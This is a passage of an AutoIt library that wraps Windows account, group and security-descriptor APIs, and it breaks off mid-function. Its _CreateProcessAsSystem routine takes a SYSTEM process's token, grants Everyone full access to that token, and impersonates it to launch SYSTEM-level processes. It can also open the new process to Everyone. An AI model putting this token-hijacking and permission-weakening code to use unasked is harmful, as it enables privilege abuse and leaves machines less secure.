; #### INTERNAL USED ONLY FUNCTION ####
; =======================================================================
; Free the buffer allocated by the API NetApiBufferAlloc.
; =======================================================================
Func _LsaApiBufferFree($pMem)
	Local $iResult
	$iResult = DllCall("Netapi32.dll", "dword", "NetApiBufferFree", "ptr", $pMem)
	Return SetError($iResult[0], 0, $iResult[0] = 0)
EndFunc	;==>_LsaApiBufferFree

; #### INTERNAL USED ONLY FUNCTION ####
; =======================================================================
; Query the size of the buffer allocated by the API NetApiBufferAlloc function.
; =======================================================================
Func _LsaApiBufferSize($pBuffer)
	Local $iResult
	$iResult = DllCall("Netapi32.dll", "long", "NetApiBufferSize", "ptr", $pBuffer, "dword*", 0)
	Return SetError($iResult[0], 0, $iResult[2])
EndFunc	;==>_LsaApiBufferSize

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaEnumerateLocalAccounts
; Description	: This function enumerates all the user accounts in the specified system.
; Parameter(s)	: $iFilter	- A value of USER ACCOUNT FILETER CONSTANTS.
;		: $sSystem	- The computer name from which the local user accounts are retrieved, default to local.
; Return values	: If succeeds, the return value is an array contains the following format:
;		:	- $aArray[0]	- The number of user accounts returned.
;		:	- $aArray[1]	- The first user's name.
;		:	- $aArray[2]	- The second user's name.
;		:	- ... ...
; Author	: Pusofalse
; =======================================================================
Func _LsaEnumerateLocalAccounts($iFilter = $FILTER_ALL_USER_ACCOUNTS, $sSystem = "")
	Local $iResult, $tBuffer, $pBuffer, $aResult[1], $tagBuffer, $tName

	$iResult = DllCall("Netapi32.dll", "dword", "NetUserEnum", _
			"wstr", $sSystem, "dword", 0, "dword", $iFilter, _
			"ptr*", 0, "dword", -1, "int*", 0, "int*", 0, "int*", 0)
	$pBuffer = $iResult[4]
	$aResult[0] = $iResult[6]
	Redim $aResult[$iResult[6] + 1]
	For $i = 1 to $iResult[6]
		$tagBuffer &= "ptr;"
	Next
	For $i = 1 to $iResult[6]
		$tBuffer = DllStructCreate($tagBuffer, $iResult[4])
		$tName = DllStructCreate("wchar[128]", DllStructGetData($tBuffer, $i))
		$aResult[$i] = DllStructGetData($tName, 1)
		$tName = 0
	Next
	_LsaApiBufferFree($pBuffer)
	Return SetError($iResult[0], 0, $aResult)
EndFunc	;==>_LsaEnumerateLocalAccounts

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaAddLocalUser
; Description	: This function adds a local user on the specified system.
; Parameter(s)	: $sUser	- The name of the user account.
;		: $sPswd	- The password of the user.
;		: $iFlags	- A set of bits flag indicates the initial state of the newly created local user. Zero indicates normal.
;		: $sSystem	- System on which the function executes, default to local system.
; Return values	: True indicates success, false indicates failure.
; Author	: Pusofalse
; Remarks	: The user account newly created does not belong any local group, use _LsaLocalGroupAddMembers function to add members.
; =======================================================================
Func _LsaAddLocalUser($sUser, $sPswd, $iFlag = 0, $sSystem = "")
	Local $iResult, $tUser, $tPswd, $tBuffer, $pBuffer, $v_Nul

	$tUser = DllStructCreate("wchar[" & StringLen($sUser) * 2 + 2 & "]")
	$tPswd = DllStructCreate("wchar[" & StringLen($sPswd) * 2 + 2 & "]")
	$tBuffer = DllStructCreate("ptr[2];dword[2];ptr[2];dword;ptr")
	$pBuffer = DllStructGetPtr($tBuffer)
	DllStructSetData($tUser, 1, $sUser)
	DllStructSetData($tPswd, 1, $sPswd)
	DllStructSetData($tBuffer, 1, DllStructGetPtr($tUser), 1)
	DllStructSetData($tBuffer, 1, DllStructGetPtr($tPswd), 2)
	DllStructSetData($tBuffer, 2, 1, 2)
	DllStructSetData($tBuffer, 4, $iFlag)

	$iResult = DllCall("Netapi32.dll", "dword", "NetUserAdd", _
			"wstr", $sSystem, "dword", 1, "ptr", $pBuffer, "long*",0)
	$v_Nul = _FreeVariable($tUser) & _FreeVariable($tPswd) & _FreeVariable($tBuffer)
	$v_Nul = _LookupAccountName($sUser)
	Return SetError($iResult[0], 0, $v_Nul)
EndFunc	;==>_LsaAddLocalUser

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaDelLocalUser
; Description	: Deletes an user account from the specified system.
; Parameter(s)	: $sUser	- The name of the user to delete.
;		: $sSystem	- System on which the function execute, blank indicates local.
; Return values	: True indicates success, false to failure in the case the @error is set to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _LsaDelLocalUser($sUser, $sSystem = "")
	Local $iResult
	$iResult = DllCall("Netapi32.dll", "dword", "NetUserDel", _
			"wstr", $sSystem, "wstr", $sUser)
	Return SetError($iResult[0], 0, $iResult[0] = 0)
EndFunc	;==>_LsaDelLocalUser

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaAddLocalGroup
; Description	: This function adds a local group on the specified system.
; Parameter(s)	: $sName		- The name of the new local group.
;		: $sComment	- The comment of the new local group, can be NULL.
;		: $sSystem	- System name on which the function executes, default to local.
; Return values	: If success, returns true, else returns false and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _LsaAddLocalGroup($sName, $sComment, $sSystem = "")
	Local $tName, $tBuffer, $pBuffer, $iResult, $tagName

	$tagName = "wchar[" & (StringLen($sName) * 2 + 2) & "];wchar[" & (StringLen($sName) * 2 + 2) & "]"
	$tName = DllStructCreate($tagName)
	DllStructSetData($tName, 1, $sName)
	DllStructSetData($tName, 2, $sComment)

	$tBuffer = DllStructCreate("ptr;ptr")
	$pBuffer = DllStructGetPtr($tBuffer)
	DllStructSetData($tBuffer, 1, DllStructGetPtr($tName, 1))
	DllStructSetData($tBuffer, 2, DllStructGetPtr($tName, 2))

	$iResult = DllCall("Netapi32.dll", "dword", "NetLocalGroupAdd", _
			"wstr", $sSystem, "dword", 1, "ptr", $pBuffer, "int*", 0)
	_FreeVariable($tBuffer)
	_FreeVariable($tName)
	Return SetError($iResult[0], 0, $iResult[0] = 0)
EndFunc	;==>_LsaAddLocalGroup

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaDelLocalGroup
; Description	; Deletes a local group on the specified system.
; Parameter(s)	: $sGroup	- The name of the local group to delete.
;		: $sSystem	- Specifies the system on which the local group is deleted, default to local.
; Return values	: If success, returns true, else returns false and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _LsaDelLocalGroup($sGroup, $sSystem = "")
	Local $iResult
	$iResult = DllCall("Netapi32.dll", "dword", "NetLocalGroupDel", _
			"wstr", $sSystem, "wstr", $sGroup)
	Return SetError($iResult[0], 0, $iResult[0] = 0)
EndFunc	;==>_LsaDelLocalGroup

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaEnumerateLocalGroups
; Description	: This function lists the local groups exist on the specified system.
; Parameter(s)	: $sSystem	- Specifies system, the function retrieves the local groups exist on this system. Default to local.
; Return values	: An array with following format:
;		:	- $aArray[0][0] - The number of entries returned.
;		:	- $aArray[1][0] - 1st local group's name.
;		:	- $aArray[1][1] - 1st local group's comments, empty indicates the local group has no comments.
;		:	- $aArray[2][0] - 2nd local group's name.
;		:	- ... ...
;		: If fails, the value of $aArray[0][0] is set to zero, @error is a system error code.
; Author	: Pusofalse
; =======================================================================
Func _LsaEnumerateLocalGroups($sSystem = "")
	Local $aResult[1][2] = [[0]], $pBuffer, $tBuffer, $iResult, $tCmt, $tName

	$iResult = DllCall("Netapi32.dll", "dword", "NetLocalGroupEnum", _
			"wstr", $sSystem, "dword", 1, "ptr*", 0, _
			"dword", -1,"int*", 0, "int*", 0, "int*", 0)
	$pBuffer = $iResult[3]
	$aResult[0][0] = $iResult[5]
	Redim $aResult[$iResult[5] + 1][2]
	For $i = 1 to $iResult[5]
		$tBuffer = DllStructCreate("ptr;ptr", $iResult[3])
		$tName = DllStructCreate("wchar[256]", DllStructGetData($tBuffer,1))
		$tCmt = DllStructCreate("wchar[256]", DllStructGetData($tBuffer, 2))
		$aResult[$i][0] = DllStructGetData($tName, 1)
		$aResult[$i][1] = DllStructGetData($tCmt, 1)
		_FreeVariable($tCmt)
		_FreeVariable($tName)
		_FreeVariable($tBuffer)
		$iResult[3] += 8
	Next
	_LsaApiBufferFree($pBuffer)
	Return SetError($iResult[0], 0, $aResult)
EndFunc	;==>_LsaEnumerateLocalGroups

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaLocalGroupGetMembers
; Description	: Lists the memebers exist in the specified local group.
; Parameter(s)	: $sGroup	- The local group name.
;		: $sSystem	- System name on which the function executes, default to local.
; Return values	: An array in the form:
;		:	- $aArray[0][0]	- The number of returned entries.
;		:	- $aArray[1][0]	- 1st user account name in the form: Domain\UserName.
;		:	- $aArray[1][1]	- 1st user account's SID, in string format.
;		:	- ... ...
;		: If fails, $aArray[0][0] is set zero, @error is a system error code.
; Author	: Pusofalse
; =======================================================================
Func _LsaLocalGroupGetMembers($sGroup, $sSystem = "")
	Local $iResult, $tBuffer, $pBuffer, $aResult[1][2] = [[0]], $pSid

	$iResult = DllCall("Netapi32.dll", "dword", "NetLocalGroupGetMembers", _
			"wstr", $sSystem, "wstr", $sGroup, "dword", 0, _
			"ptr*", 0, "dword", -1, "int*", 0, "int*", 0, "int*", 0)
	$pBuffer = $iResult[4]
	$aResult[0][0] = $iResult[6]
	Redim $aResult[$iResult[6] + 1][2]
	For $i = 1 to $iResult[6]
		$tBuffer = DllStructCreate("ptr Sid", $iResult[4])
		$pSid = _CopySid(DllStructGetData($tBuffer, "Sid"))
		$aResult[$i][0] = _LookupAccountSid($pSid)
		$aResult[$i][1] = _ConvertSidToStringSid($pSid)
		_HeapFree($pSid)
		_FreeVariable($tBuffer)
		$iResult[4] += 4
	Next
	_LsaApiBufferFree($pBuffer)
	Return SetError($iResult[0], 0, $aResult)
EndFunc	;==>_LsaLocalGroupGetMembers

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaLocalGroupAddMembers
; Description	: Add members to specified local group.
; Parameter(s)	: $sGroup	- To which the members are added.
;		: $aMember	- Either an user account name string, or an array in the following form:
;		:	- $aMember[0] - 1st user account name.
;		:	- $aMember[1] - 2nd user account name.
;		:	- ... ...
;		: $sSystem	- System on which the function executes, default to local.
; Return values	: True indicates success, false indicates failure, @error is one system error code.
; Author	: Pusofalse
; =======================================================================
Func _LsaLocalGroupAddMembers($sGroup, $aMember, $sSystem = "")
	Local $iResult, $tagBuffer, $tBuffer, $pBuffer, $tagMember, $tMember, $pMember, $iNum

	If IsArray($aMember) Then
		If Ubound($aMember, 0) <> 1 Then Return SetError(13, 0, 0)
		$iNum = Ubound($aMember)
		For $i = 0 to Ubound($aMember) - 1
			$tagBuffer &= "ptr;"
			$tagMember &= "wchar[" & (StringLen($aMember[$i]) + 2) * 2 & "];"
		Next
	Else
		$iNum = 1
		$tagBuffer = "ptr"
		$tagMember = "wchar[" & (StringLen($aMember) + 2) * 2 & "]"
	EndIf
	$tBuffer = DllStructCreate($tagBuffer)
	$pBuffer = DllStructGetPtr($tBuffer)
	$tMember = DllStructCreate($tagMember)
	$pMember = DllStructGetPtr($tMember)
	If IsArray($aMember) Then
		For $i = 0 to Ubound($aMember) - 1
			DllStructSetData($tMember, $i + 1, $aMember[$i])
			DllStructSetData($tBuffer, $i + 1, DllStructGetPtr($tMember, $i + 1))
		Next
	Else
		DllStructSetData($tMember, 1, $aMember)
		DllStructSetData($tBuffer, 1, DllStructGetPtr($tMember))
	EndIf
	$iResult = DllCall("Netapi32.dll", "dword", "NetLocalGroupAddMembers", _
			"wstr", $sSystem, "wstr", $sGroup, "dword", 3, _
			"ptr", $pBuffer, "dword", $iNum)
	_FreeVariable($tBuffer)
	_FreeVariable($tMember)
	Return SetError($iResult[0], 0, $iResult[0] = 0)
EndFunc	;==>_LsaLocalGroupAddMembers

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaLocalGroupDelMembers
; Description	: Deletes memebers from the local group.
; Parameter(s)	: $sGroup	- Local group name.
;		: $aMember	- Either an user account string or an array in the form:
;		:	- $aMember[0] - 1st user account.
;		:	- $aMember[1] - 2nd user account.
;		:	- ... ...
;		: $sSystem	- System on which the function executes.
; Return values	: True indicates success, false to failure, in this case to set @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _LsaLocalGroupDelMembers($sGroup, $aMember, $sSystem = "")
	Local $iResult, $tagBuffer, $tBuffer, $pBuffer, $tagMember, $tMember, $pMember, $iNum

	If IsArray($aMember) Then
		If Ubound($aMember, 0) <> 1 Then Return SetError(13, 0, 0)
		$iNum = Ubound($aMember)
		For $i = 0 to Ubound($aMember) - 1
			$tagBuffer &= "ptr;"
			$tagMember &= "wchar[" & (StringLen($aMember[$i]) + 2) * 2 & "];"
		Next
	Else
		$iNum = 1
		$tagBuffer = "ptr"
		$tagMember = "wchar[" & (StringLen($aMember) + 2) * 2 & "]"
	EndIf
	$tBuffer = DllStructCreate($tagBuffer)
	$pBuffer = DllStructGetPtr($tBuffer)
	$tMember = DllStructCreate($tagMember)
	$pMember = DllStructGetPtr($tMember)
	If IsArray($aMember) Then
		For $i = 0 to Ubound($aMember) - 1
			DllStructSetData($tMember, $i + 1, $aMember[$i])
			DllStructSetData($tBuffer, $i + 1, DllStructGetPtr($tMember, $i + 1))
		Next
	Else
		DllStructSetData($tMember, 1, $aMember)
		DllStructSetData($tBuffer, 1, DllStructGetPtr($tMember))
	EndIf
	$iResult = DllCall("Netapi32.dll", "dword", "NetLocalGroupDelMembers", _
			"wstr", $sSystem, "wstr", $sGroup, "dword", 3, _
			"ptr", $pBuffer, "dword", $iNum)
	_FreeVariable($tBuffer)
	_FreeVariable($tMember)
	Return SetError($iResult[0], 0, $iResult[0] = 0)
EndFunc	;==>_LsaLocalGroupDelMembers

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaStringIsUserAccount
; Description	: Determines one string whether is an user account's name.
; Parameter(s)	: $sUserAccount	- A string to validate.
;		: $sSystem	- The system on which the function executes, default is local.
; Return values	: If $sUserAccount is an user account in $sSystem, returns the system name on which the function tested. Otherwise, returns empty and sets @error to ERROR_INVALID_SID.
; Author	: Pusofalse
; =======================================================================
Func _LsaStringIsUserAccount($sUserAccount, $sSystem = "")
	Local $pSid

	If $sSystem = "" Then $sSystem = @ComputerName
	$pSid = _LookupAccountName($sUserAccount, $sSystem)
	If _IsValidSid($pSid) Then Return SetError(0, _HeapFree($pSid), $sSystem)
	Return SetError(@error, _HeapFree($pSid), "")
EndFunc	;==>_LsaStringIsUserAccount

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaLocalUserGetGroups
; Description	: This function lists the local group that the specified user belongs.
; Parameter(s)	: $sUserName	- The user account's name.
;		: $sSystem	- The system on which the function executes, default to local.
; Return values	: If succeeds, returns an array with following format:
;		: $aArray[0]	- The number of returned entries.
;		: $aArray[1]	- 1st local group the $sUserName belongs.
;		: $aArray[2]	- 2nd local group the $sUserName belongs.
;		: If fails, $aArray[0] is set to zero, @error is a system error code.
; Author	: Pusofalse
; Remarks		: If the $sUserName does not belong any local group, $aArray[0] is either set to zero, but @error still is ERROR_SUCCESS (0).;		
; =======================================================================
Func _LsaLocalUserGetGroups($sUserName, $sSystem = "")
	Local $iResult, $aResult[1] = [0], $tName, $pName

	$iResult = DllCall("Netapi32.dll", "dword", "NetUserGetLocalGroups", _
			"wstr", $sSystem, "wstr", $sUserName, _
			"dword", 0, "dword", 1, "ptr*", 0, _
			"dword", -1, "int*", 0, "int*", 0)
	$pName = $iResult[5]
	$aResult[0] = $iResult[7]
	Redim $aResult[$iResult[7] + 1]
	For $i = 1 to $aResult[0]
		$tBuffer = DllStructCreate("ptr", $iResult[5])
		$tName = DllStructCreate("wchar[256]", DllStructGetData($tBuffer, 1))
		$aResult[$i] = DllStructGetData($tName, 1)
		_FreeVariable($tName)
		_FreeVariable($tBuffer)
		$iResult[5] += 4
	Next
	_LsaApiBufferFree($pName)
	Return SetError($iResult[0], 0, $aResult)
EndFunc	;==>_LsaLocalUserGetGroups

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaLocalUserGetInfo
; Description	: Query the user account information on specified system.
; Parameter(s)	: $sUserName	- The user account's name.
;		: $iLevel	- Specifies the information is retrieves.
;		: $sSystem	- The system on which the function executes, default to local.
; Return values	: If succeeds, returns a structure contains the user account information requires (information depends on the $iLevel parameter), in BYTE format, to decode the structure, see MSDN link. If fails, returns zero and sets @error to a system error code.
; Author	: Pusofalse
; Remarks	: If you finished with this structure, pass its pointer to _LsaApiBufferFree to free it.
; Link	: http://msdn.microsoft.com/en-us/library/aa370654(VS.85).aspx
; =======================================================================
Func _LsaLocalUserGetInfo($sUserName, $iLevel = 1, $sSystem = "")
	Local $iResult, $tBuffer, $iSizeofBuffer

	$iResult = DllCall("Netapi32.dll", "long", "NetUserGetInfo", "wstr", $sSystem, _
			"wstr", $sUserName, "dword", $iLevel, "ptr*", 0)
	$iSizeofBuffer = _LsaApiBufferSize($iResult[4])
	Return SetError($iResult[0], $iSizeofBuffer, $iResult[4])
EndFunc	;==>_LsaLocalUserGetInfo

; #### FUNCTION ####
; =======================================================================
; Name	: _CreateProcessAsUser
; Description	: Creates a new process and its primary thread. The new process runs in the security context of the user represented by the specified token.
; Parameter(s)	: $hToken		- Handle to the token, must have TOKEN_QUERY, TOKEN_DUPLICATE, TOKEN_ASSIGN_PRIMARY access rights.
;		: $sApp	- The application to be executed.
;		: $sArg	- Arguments passed to the $sApp, if not arguments, this parameter can be NULL.
;		: $pSecurAttr	- A pointer to a SECURITY_ATTRIBUTES structure that specifies a security descriptor for the new process object and determines whether child processes can inherit the returned handle to the process.
;		: $hProcess	- A variable receives the handle to the newly created process.
;		: $hThread	- A variable receives the handle to the primary thread of the newly created process.
;		: $iCreation	- The creation flag, specifies the priority class of the new process, default to NORMAL PRIORITY.
;		: $sWorkingDir	- Specifies the working directory, default to the where $sApp is in. If non-empty, the parameter just can only contains the Ansi string but cannot contain the unicode string, if $sWorkingDir does not exist, the path of the $sApp is used either.
;		: $iState	- The initial state, see @SW_* macros for a value, default to @SW_SHOWNORMAL.
; Return values	: If succeeds, the return value is the identifier of the new process, $hProcess and $hThread parameters receive the process and thread handles, when you finished with these two handles, call _LsaCloseHandle to close them. If fails, the return value is set to zero, and @error is set to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _CreateProcessAsUser($hToken, $sApp, $sArg, $pSecurAttr, ByRef $hProcess, ByRef $hThread, $iCreation = 0x20, $sWorkingDir = "", $iState = -1, $fInheritHandle = 0)
	Local $tStartup, $pStartup, $iMask = 4, $tProcess, $pProcess, $iResult, $iPid, $iSysError, $tWD, $pWD

	If $iState <> -1 Then $iMask = bitOR($iMask, 1)
	$tStartup = DllStructCreate("dword;ptr[3];dword[8];short[2];ptr;hWnd[3]")
	$pStartup = DllStructGetPtr($tStartup)
	DllStructSetData($tStartup, 1, DllStructGetSize($tStartup))
	DllStructSetData($tStartup, 3, 77, 1)
	DllStructSetData($tStartup, 3, 77, 2)
	DllStructSetData($tStartup, 3, $iMask, 8)
	If $iState <> -1 Then DllStructSetData($tStartup, 4, $iState, 1)

	$tProcess = DllStructCreate("hWnd[2];dword[2]")
	$pProcess = DllStructGetPtr($tProcess)

	If $sWorkingDir <> "" And FileExists($sWorkingDir) And StringIsASCII($sWorkingDir) Then
		$tWD = DllStructCreate("char[" & StringLen($sWorkingDir) + 1 & "]")
		$pWD =DllStructGetPtr($tWD)
		DllStructSetData($tWD, 1, $sWorkingDir)
	EndIf

	$iResult = DllCall("Advapi32.dll", "int", "CreateProcessAsUser", _
			"hWnd", $hToken, "str", $sApp, "str", " " & $sArg, _
			"ptr", $pSecurAttr, "ptr", $pSecurAttr, "int", $fInheritHandle, _
			"dword", $iCreation, "ptr", 0, "ptr", $pWD, _
			"ptr", $pStartup, "ptr", $pProcess)
	$iSysError = _GetLastError()
	$hProcess = DllStructGetData($tProcess, 1, 1)
	$hThread = DllStructGetData($tProcess, 1, 2)
	$iPid = DllStructGetData($tProcess, 2, 1)
	_FreeVariable($tStartup)
	_FreeVariable($tProcess)
	Return SetError($iSysError, 0, $iPid)
EndFunc	;==>_CreateProcessAsUser

; #### FUNCTION ####
; =======================================================================
; Name	: _CreateProcessAsSystem
; Description	: Creates a system-level process, so that you can debug any other processes.
; Parameter(s)	: $sApp	- The application to be created.
;		: $sArg	- The arguments passed to the $sApp, if no arguments, this parameter can be NULL.
;		: $iSystemPid	- An existing system-level process, either image name or identifier, can not be NULL.
;		: $fProtect	- If true, the function enables the minimum rights to everyone, default to false.
;		: $iCreation	- The creation flag, the parameter specifies the priority class, default to NORMAL PRIORITY.
;		: $sWorkingDir	- Specifies the working directory, default to the where $sApp is in. If non-empty, the parameter just can only contains the Ansi string but cannot contain the unicode string, if $sWorkingDir does not exist, the path of the $sApp is used either.
;		: $iState	- The initial state, see @SW_* macros for a value, default to @SW_SHOWNORMAL.
; Return values	: If succeeds, the return value is the identifier of the newly created process, else returns zero and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _CreateProcessAsSystem($sApp, $sArg, $iSystemPid, $fProtect = False, $iCreation = 0x20, $sWorkingDir = "", $iState = -1, $fInheritHandle = 0)
	Local $aPrivilege[2][2] = [[$SE_DEBUG_NAME, 2], [$SE_RESTORE_NAME, 2]]
	Local $hToken, $hProcess, $hThread, $iPid, $iSysError, $aOrigSecur, $pOwner
	Local $pNewAcl, $iAccessMask = bitOR($READ_CONTROL, $WRITE_DAC)

	$iSystemPid = ProcessExists($iSystemPid)
	If Not ProcessExists($iSystemPid) Then Return SetError(2, 1, 0)

	$hToken = _OpenProcessToken(-1)
	_AdjustTokenPrivileges($hToken, $aPrivilege)
	_LsaCloseHandle($hToken)

	$hToken = _OpenProcessToken($iSystemPid, $iAccessMask)
	If Not $hToken Then Return SetError(@error, 0, 0)
	$aOrigSecur = _GetSecurityInfo($hToken, $SE_KERNEL_OBJECT, 4)
	$pNewAcl = _SetEntriesInAcl1("Everyone", $TOKEN_ALL_ACCESS, 1, 0)
	If Not _SetSecurityInfo($hToken, $SE_KERNEL_OBJECT, 4, 0, 0, $pNewAcl, 0) Then
		Return SetError(@error, _LsaLocalFree($pNewAcl) And _LsaCloseHandle($hToken), 0)
	EndIf
	_LsaLocalFree($pNewAcl)
	_LsaCloseHandle($hToken)
	$hToken = _OpenProcessToken($iSystemPid, $TOKEN_ALL_ACCESS)
	If Not $hToken Then Return SetError(@error, 0, 0)
	If Not _ImpersonateLoggedOnUser($hToken) Then Return SetError(@error, _LsaCloseHandle($hToken), 0)

	$iPid = _CreateProcessAsUser($hToken, $sApp, $sArg, 0, $hProcess, $hThread, $iCreation, $sWorkingDir, $iState, $fInheritHandle)
	$iSysError = @error
	_SetSecurityInfo($hToken, $SE_KERNEL_OBJECT, 4, 0, 0, $aOrigSecur[6], 0)
	_RevertToSelf()
	If $fProtect = True Then
		$pOwner = _LookupAccountName("Creator Owner")
		$pNewAcl = _SetEntriesInAcl1("Everyone", $GENERIC_ALL, 3, 0)
		_SetSecurityInfo($hProcess, $SE_KERNEL_OBJECT, 5, $pOwner, 0, $pNewAcl, 0)
		_SetSecurityInfo($hThread, $SE_KERNEL_OBJECT, 5, $pOwner, 0, $pNewAcl, 0)
		_HeapFree($pOwner)
		_LsaLocalFree($pNewAcl)
	EndIf
	_LsaCloseHandle($hToken)
	_LsaCloseHandle($hProcess)
	_LsaCloseHandle($hThread)
	Return SetError($iSysError, 0, $iPid)
EndFunc	;==>_CreateProcessAsSystem

; #### FUNCTION ####
; ================================================================================
; Name	: _LsaInitializeSecurityAttributes
; Description	: This function initializes an SECURITY_ATTRIBUTES structure.
; Parameter(s)	: ByRef $pSecurAttr - A variable receives the pointer to the SECURITY_ATTRIBUTES structure.
;		: $pSecurDesc	- A pointer to a security descriptor.
;		: $fInherit	- Inherit options.
; Return values	: SECURITY_ATTRIBUTES structure.
; Author	: Pusofalse
; ================================================================================
Func _LsaInitializeSecurityAttributes(ByRef $pSecurAttr, $pSecurDesc = 0, $fInherit = 0)
	Local $tSecurAttr

	$pSecurAttr = _HeapAlloc(12)
	$tSecurAttr = DllStructCreate($tagSECUR_ATTRIBUTES, $pSecurAttr)
	DllStructSetData($tSecurAttr, "Size", 12)
	DllStructSetData($tSecurAttr, "Securitydescriptor", $pSecurDesc)
	DllStructSetData($tSecurAttr, "Inherit", $fInherit)
	Return $tSecurAttr
EndFunc	;==>_LsaInitializeSecurityAttributes

Func _LsaInitializeObjectAttributes($sObject,$iAttributes =0, $pSecurDescr = 0, $hRootDir = 0)
	Local $pBuffer, $tBuffer, $pObject

	$pObject = _LsaInitializeBufferW($sObject)
	$pBuffer = _HeapAlloc(24)
	$tBuffer = DllStructCreate($tagOBJECT_ATTRIBUTES, $pBuffer)
	DllStructSetData($tBuffer, "Length", 24)
	DllStructSetData($tBuffer, "RootDir", $hRootDir)
	DllStructSetData($tBuffer, "BufferW", $pObject)
	DllStructSetData($tBuffer, "Attributes", $iAttributes)
	DllStructSetData($tBuffer, "Securitydescriptor", $pSecurDescr)
	Return $pBuffer
EndFunc	;==>_LsaInitializeObjectAttributes

; #### FUNCTION ####
; =======================================================================
; Name	: _GetSecurityDescriptorOwner
; Description	: Retrieves the owner information of a security descriptor.
; Parameter	: $pSecurDesc	- A pointer a security descriptor.
; Return values	: Success	- A pointer to a SID.
;		: Failure	- Zero, and set @error.
; Author		: Pusofalse
; =======================================================================
Func _GetSecurityDescriptorOwner($pSecurDesc)
	Local $pOwner
	If Not _IsValidSecurityDescriptor($pSecurDesc) Then Return SetError(@error, 0, 0)
	$pOwner = DllCall("Advapi32.dll", "int", "GetSecurityDescriptorOwner", _
			"ptr", $pSecurDesc, "ptr*", 0, "int*", 0)
	Return SetError(_GetLastError(), $pOwner[3], $pOwner[2])
EndFunc	;==>_GetSecurityDescriptorOwner

; #### FUNCTION ####
; =======================================================================
; Name	: _GetSecurityDescriptorDacl
; Description	: Retrieves a pointer to the discretionary access control list (DACL) in a specified security descriptor.
; Parameter	: $pSecurDesc	- A pointer to the security descriptor.
; Return values	: Success	- A DACL pointer, set @extended to the presence of the DACL.
;		: Failrue	- Zero, and set @error.
; Author		: Pusofalse
; =======================================================================
Func _GetSecurityDescriptorDacl($pSecurDesc)
	Local $pDacl
	If Not _IsValidSecurityDescriptor($pSecurDesc) Then Return SetError(@error, 0, 0)
	$pDacl = DllCall("Advapi32.dll", "int", "GetSecurityDescriptorDacl", _
			"ptr", $pSecurDesc, "int*", 0, "ptr*", 0, "int*", 0)
	Return SetError(_GetLastError(), $pDacl[2], $pDacl[3])
EndFunc	;==>_GetSecurityDescriptorDacl

; #### FUNCTION ####
; =======================================================================
; Name	: _GetSecurityDescriptorSacl
; Description	: Retrieves the system access control list (SACL) information of a security descriptor.
; Parameter	: $pSecurDesc	- A pointer to a security descriptor.
; Return values	: A pointer to a SACL indicates success, else returns zero and sets @error.
; Author		: Pusofalse
; =======================================================================
Func _GetSecurityDescriptorSacl($pSecurDesc)
	Local $pSacl
	If Not _IsValidSecurityDescriptor($pSecurDesc) Then Return SetError(@error, 0, 0)
	$pSacl = DllCall("Advapi32.dll", "int", "GetSecurityDescriptorSacl", _
			"ptr", $pSecurDesc, "int*", 0, "ptr*", 0, "int*", 0)
	Return SetError(_GetLastError(), $pSacl[4], $pSacl[3])
EndFunc	;==>_GetSecurityDescriptorSacl

; #### FUNCTION ####
; =======================================================================
; Name	: _GetSecurityDescriptorGroup
; Description	: Retrieves the primary group information from a secucity descriptor.
; Parameter	: $pSecurDesc	- A pointer to the security descriptor
; Return values	: Success	- A pointer to a SID identifies the primary group.
;		: Failure	- Zero, and set @error.
; Author		: Pusofalse
; =======================================================================
Func _GetSecurityDescriptorGroup($pSecurDesc)
	Local $pGroup

	If Not _IsValidSecurityDescriptor($pSecurDesc) Then Return SetError(@error, 0, 0)
	$pGroup = DllCall("Advapi32.dll", "int", "GetSecurityDescriptorGroup", _
			"ptr", $pSecurDesc, "ptr*", 0, "int*", 0)
	Return SetError(_GetLastError(), $pGroup[3], $pGroup[2])
EndFunc	;==>_GetSecurityDescriptorGroup

; #### FUNCTION ####
; =======================================================================
; Name		: _SetSecurityDescriptorOwner
; Description	: The function sets the owner information of an absolute-format security descriptor. It replaces any owner information already present in the security descriptor.
; Parameters	: $pSecurDesc	- A pointer to SD structure.
;		: $pOwer		- A pointer to SID structure.
;		: $fDefault	- Optional, indicates whether the owner information is derived from a default mechanism.
; Return values	: True indicates success, otherwise indicates failure.
; Author		: Pusofalse
; =======================================================================
Func _SetSecurityDescriptorOwner($pSecurDesc, $pOwner, $fDefault = True)
	Local $iResult
	If $fDefault = Default Then $fDefault = True
	If $pOwner And Not _IsValidSid($pOwner) Then Return SetError(@error)
	If Not _IsValidSecurityDescriptor($pSecurDesc) Then Return SetError(@error)
	$iResult = DllCall("Advapi32.dll", "int", "SetSecurityDescriptorOwner", _
			"ptr", $pSecurDesc, "ptr", $pOwner, "int", $fDefault)
	Return SetError(_GetLastError(), 0, $iResult[0] <> 0)
EndFunc	;==>_SetSecurityDescriptorOwner

; #### FUNCTION ####
; =======================================================================
; Name	: _SetSecurityDescriptorDacl
; Description	:  Sets information in a discretionary access control list (DACL).
; Parameters	: $pSecurDesc	- Pointer to a SD Structure.
;		: $pDacl		- Pointer to a DACL.
;		: $fPresent	- A BOOL value that indicates the presence of a DACL in the security descriptor.
;		: $fDefault	- A BOOL value that indicates the source of the DACL.
; Return values	: True indicates success, else False.
; Author		: Pusofalse
; =======================================================================
Func _SetSecurityDescriptorDacl($pSecurDesc, $pDacl, $fPresent = True, $fDefault = True)
	Local $iResult

	If $fPresent = Default Then $fPresent = True
	If $fDefault = Default Then $fDefault = True
	If $pDacl And Not _IsValidAcl($pDacl) Then Return SetError(@error, 0, 0)
	If Not _IsValidSecurityDescriptor($pSecurDesc) Then Return SetError(@error)
	$iResult = DllCall("Advapi32.dll", "int", "SetSecurityDescriptorDacl", _
			"ptr", $pSecurDesc, "int", $fPresent, _
